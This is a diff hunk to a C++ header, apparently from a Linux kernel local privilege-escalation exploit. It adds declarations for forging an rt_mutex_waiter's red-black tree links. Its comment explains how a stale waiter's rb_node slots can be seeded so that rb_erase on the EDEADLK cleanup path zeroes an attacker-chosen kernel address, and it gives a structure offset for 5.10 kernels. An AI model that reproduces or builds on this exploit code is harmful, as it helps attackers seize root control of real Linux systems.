@@ -59,6 +59,19 @@ namespace lsprivilege::memory {
         std::span<std::byte> buffer, std::size_t waiter_offset,
         std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
         std::uintptr_t fake_lock) noexcept;
+
+    /* Plant parent = target-8, children = 0 into both rb_node slots of the
+     * stale waiter so rb_erase on the EDEADLK cleanup path deterministically
+     * writes *(target) = 0. pi_tree_offset is the flat-layout offset of
+     * pi_tree_entry inside rt_mutex_waiter (0x18 on shallow 5.10). */
+    [[nodiscard]] bool encode_multicast_waiter_trees(
+        std::span<std::byte> buffer, std::size_t waiter_offset,
+        std::size_t pi_tree_offset, std::uintptr_t target) noexcept;
+
+    /* Read a little-endian u64 from a stamp buffer; 0 when out of range. */
+    [[nodiscard]] uint64_t load_stamp_u64(const unsigned char *buffer,
+                                          std::size_t size,
+                                          std::size_t offset) noexcept;
 } // namespace lsprivilege::memory
 
 namespace lsprivilege::memory {
